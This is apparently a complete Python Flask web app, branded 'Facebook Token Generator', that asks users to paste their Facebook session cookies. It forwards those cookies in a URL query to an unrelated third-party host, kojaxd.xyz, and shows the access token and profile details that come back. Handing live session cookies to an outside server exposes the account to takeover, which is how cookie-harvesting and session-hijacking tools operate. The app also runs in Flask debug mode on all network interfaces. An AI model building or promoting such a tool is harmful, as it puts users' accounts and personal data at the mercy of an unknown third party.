from flask import Flask, request, render_template_string, jsonify
import requests

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Token Generator | By Shan</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #ff9900; /* Changed to Orange */
            --primary-dark: #cc7a00; /* Darker Orange */
            --secondary: #ff6600; /* Secondary Orange */
            --light: #f8f9fa;
            --dark: #212529;
            --success: #4cc9f0;
            --danger: #f72585;
            --warning: #f8961e;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            /* Original: background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); */
            background: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg') no-repeat center center fixed;
            background-size: cover;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .container {
            max-width: 800px;
            margin: 2rem auto;
            padding: 2rem;
            background: rgba(255, 255, 255, 0.95); /* Added slight transparency for background image */
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            position: relative;
            overflow: hidden;
            z-index: 1;
        }
        
        .container::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 8px;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
        }
        
        h1 {
            color: var(--primary);
            text-align: center;
            margin-bottom: 1.5rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }
        
        .form-group {
            margin-bottom: 1.5rem;
        }
        
        label {
            display: block;
            margin-bottom: 0.5rem;
            color: var(--dark);
            font-weight: 500;
        }
        
        textarea {
            width: 100%;
            padding: 1rem;
            border: 2px solid #e9ecef;
            border-radius: 8px;
            min-height: 120px;
            font-family: inherit;
            resize: vertical;
            transition: all 0.3s ease;
        }
        
        textarea:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(255, 153, 0, 0.2); /* Adjusted shadow color to orange */
        }
        
        .btn {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 0.8rem 1.5rem;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1rem;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            transition: all 0.3s ease;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        .btn:hover {
            background: linear-gradient(135deg, var(--primary-dark), var(--secondary));
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .result {
            margin-top: 2rem;
            padding: 1.5rem;
            border-radius: 8px;
            background-color: var(--light);
            border-left: 4px solid var(--primary);
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .result.success {
            border-left-color: var(--success);
        }
        
        .result.error {
            border-left-color: var(--danger);
        }
        
        .token-info {
            word-break: break-all;
            margin-top: 1rem;
        }
        
        .token-info p {
            margin-bottom: 0.5rem;
        }
        
        .token-info strong {
            color: var(--dark);
        }
        
        .profile-pic {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            object-fit: cover;
            margin: 0.5rem 0;
            border: 3px solid var(--primary);
        }
        
        footer {
            text-align: center;
            padding: 1.5rem;
            margin-top: auto;
            color: var(--dark);
            font-size: 0.9rem;
        }
        
        footer a {
            color: var(--primary);
            text-decoration: none;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 0.3rem;
        }
        
        footer a:hover {
            text-decoration: underline;
        }
        
        .svg-icon {
            width: 20px;
            height: 20px;
            fill: currentColor;
        }
        
        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin: 2rem 0;
        }
        
        .feature {
            background: var(--light);
            padding: 1rem;
            border-radius: 8px;
            text-align: center;
        }
        
        .feature svg {
            width: 40px;
            height: 40px;
            margin-bottom: 0.5rem;
            fill: var(--primary);
        }
        
        @media (max-width: 768px) {
            .container {
                margin: 1rem;
                padding: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="28" height="28" fill="#ff9900"> <!-- Changed SVG fill to Orange -->
                <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/>
            </svg>
            Facebook Token Generator
        </h1>
        <form method="POST" action="/">
            <div class="form-group">
                <label for="cookies">Enter your Facebook cookies:</label>
                <textarea id="cookies" name="cookies" placeholder="sb=abc123; datr=xyz456; c_user=12345; xs=abc123xyz456" required></textarea>
            </div>
            <button type="submit" class="btn">
                <svg class="svg-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                    <path fill-rule="evenodd" d="M12 1.5a.75.75 0 01.75.75V4.5a.75.75 0 01-1.5 0V2.25A.75.75 0 0112 1.5zM5.636 4.136a.75.75 0 011.06 0l1.592 1.591a.75.75 0 01-1.061 1.06l-1.591-1.59a.75.75 0 010-1.061zm12.728 0a.75.75 0 010 1.06l-1.591 1.592a.75.75 0 01-1.06-1.061l1.59-1.591a.75.75 0 011.061 0zm-6.816 4.496a.75.75 0 01.82.311l5.228 7.917a.75.75 0 01-.777 1.148l-2.097-.43 1.045 3.9a.75.75 0 01-1.45.388l-1.044-3.899-1.601 1.42a.75.75 0 01-1.247-.606l.569-9.47a.75.75 0 01.554-.68zM3 10.5a.75.75 0 01.75-.75H6a.75.75 0 010 1.5H3.75A.75.75 0 013 10.5zm14.25 0a.75.75 0 01.75-.75h2.25a.75.75 0 010 1.5H18a.75.75 0 01-.75-.75zm-8.962 3.712a.75.75 0 010 1.061l-1.591 1.591a.75.75 0 11-1.061-1.06l1.591-1.592a.75.75 0 011.06 0z" clip-rule="evenodd"/>
                </svg>
                Generate Token
            </button>
        </form>

        {% if result %}
        <div class="result {% if result.access_token %}success{% else %}error{% endif %}">
            {% if result.access_token %}
                <h3>🎉 Success!</h3>
                <div class="token-info">
                    <p><strong>Access Token:</strong> {{ result.access_token }}</p>
                    <p><strong>User ID:</strong> {{ result.user_id }}</p>
                    <p><strong>Name:</strong> {{ result.name }}</p>
                    {% if result.profile_picture %}
                    <p><strong>Profile Picture:</strong></p>
                    <img src="{{ result.profile_picture }}" alt="Profile" class="profile-pic">
                    {% endif %}
                </div>
            {% else %}
                <h3>❌ Error</h3>
                <p><strong>Message:</strong> {{ result.error }}</p>
                {% if result.details %}
                <p><strong>Details:</strong> {{ result.details }}</p>
                {% endif %}
            {% endif %}
        </div>
        {% endif %}
    </div>
    
    <footer>
        <p>Developed with ❤️ by <a href="https://www.facebook.com/ofrestoes" target="_blank">
            <svg class="svg-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
            </svg>
            Shan
        </a></p>
    </footer>
</body>
</html>
"""

def get_facebook_token(cookies):
    """
    Get Facebook access token and user details using cookies
    
    Args:
        cookies (str): The Facebook cookies string
        
    Returns:
        dict: Dictionary containing token, user info, or error message
    """
    url = "https://kojaxd.xyz/api/facebook_token"
    params = {'cookies': cookies}
    
    try:
        response = requests.get(url, params=params)
        if response.status_code == 200:
            return response.json()
        else:
            return {
                'error': f"API request failed with status code {response.status_code}",
                'details': response.json()
            }
    except requests.exceptions.RequestException as e:
        return {
            'error': "Failed to connect to the API server",
            'details': "Failed to connect to the API server"
        }
    except ValueError as e:
        return {
            'error': "Invalid JSON response from server",
            'details': str(e)
        }

@app.route('/', methods=['GET', 'POST'])
def index():
    result = None
    if request.method == 'POST':
        cookies = request.form.get('cookies', '').strip()
        if cookies:
            result = get_facebook_token(cookies)
    
    return render_template_string(HTML_TEMPLATE, result=result)

@app.route('/api', methods=['POST'])
def api():
    cookies = request.json.get('cookies', '').strip()
    if not cookies:
        return jsonify({'error': 'No cookies provided'}), 400
    
    result = get_facebook_token(cookies)
    return jsonify(result)

if __name__ == '__main__':
    print("🚀 Starting Facebook Token Extractor...")
    print("📧 Access the app at: http://localhost:5000")
    print("🔒 Make sure you are logged into Facebook in your browser")
    app.run(debug=True, host='0.0.0.0', port=5000)
